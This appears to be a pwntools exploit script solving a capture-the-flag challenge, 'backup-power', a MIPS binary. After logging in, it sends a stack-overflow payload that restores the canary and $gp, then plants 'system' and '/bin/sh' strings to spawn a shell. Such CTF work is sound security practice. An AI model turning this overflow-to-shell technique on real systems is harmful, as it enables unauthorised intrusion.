from pwn import *

context.binary = ELF("./backup-power", checksec=False)
p = gdb.debug(context.binary.path)
# p = process(["qemu-mips", "backup-power"])
# p = remote("backup-power.chal.uiuc.tf", 1337, ssl=True)

p.recvuntil(b"Username: ")
p.sendline(b"devolper")
p.recvuntil(b"devolper\n")

payload = (
    b"\x00" * 0x18  # fill till $s4
    + b"/bin"  # write $s4 (upto $buffer+0x1c)
    + b"\x00" * (0x2C - 0x1C)  # fill till stack canary
    + p32(0x400B0C)  # write the stack canary (upto $buffer+0x30)
    + b"B" * (0x48 - 0x30)  # fill till $gp
    + p32(0x4AA330)  # write $gp (upto $buffer+0x4c)
    + b"C" * (0x128 - 0x4C)  # fill till command
    + b"system\x00"  # write the command (upto $buffer+0x12f)
    + b"D" * (0x220 - 0x12F)  # fill till system_str
    + b"system\x00"  # write the system_str (upto $buffer+0x227)
    + b"E"  # fill till arg1
    + b"/bin/sh\x00"  # write arg1 (upto $buffer+0x230)
)
p.sendline(payload)
p.interactive()
